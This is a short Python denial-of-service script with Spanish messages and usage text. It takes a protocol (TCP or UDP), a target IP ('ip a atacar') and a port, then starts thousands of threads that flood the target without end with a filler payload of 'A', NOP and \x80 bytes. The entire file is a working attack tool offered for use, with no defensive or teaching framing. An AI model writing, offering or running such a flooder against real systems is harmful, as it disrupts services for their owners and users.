import socket
import time
import threading
import multiprocessing
from sys import argv

try:
	protocolo = str(argv[1])
	if protocolo != 'tcp' and protocolo != 'udp':
		print("introduce un protocolo valido.")
		exit()
	ip = str(argv[2])
	port = int(argv[3])
except IndexError:
	print("""
	
	error de parametros:
	<protocolo>         protocolo a usar: tcp o udp.
	<ip a atacar>       ip del objetivo.
	<puerto>            puerto por el que dirigir el ataque.
	
	python3 dos.py  <protocolo>  <ip a atacar>  <puerto>
	
	""")
	exit()

def b():
	def a():
		a = "AAAAAAAAAAAAA" * 100
		a += "\x90" * 100
		ebx ="\x80" * 100
		eax=str(a)+str(ebx) +str("AAAAAAAAAAAAA"*100)

		while True:
			if str(argv[1]) == 'tcp':
				s = socket.socket()
				s.connect((str(argv[2]), int(argv[3])))
			elif str(argv[1]) == 'udp':
				s = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)

			try:

				if str(argv[1]) == 'tcp':
					s.send(eax.encode())
				elif str(argv[1]) == 'udp':		
					s.sendto(eax.encode(),(str(argv[2]), int(argv[3])))
		
				print("funciona")

			except BrokenPipeError:

				print("error")
				time.sleep(0.1)

				try:

					if str(argv[1]) == 'tcp':
						s.send(eax.encode())
					elif str(argv[1]) == 'udp':		
						s.sendto(eax.encode(),(str(argv[2]), int(argv[3])))

				except BrokenPipeError:
					pass

			s.close()

	pilaConexiones = []

	for i in range(0, 400):
		hilo = threading.Thread(target=a)
		hilo.start()
		pilaConexiones.append(hilo)

pilaProcesos = []
for f in range(0,20):
	proceso = threading.Thread(target=b)
	proceso.start()
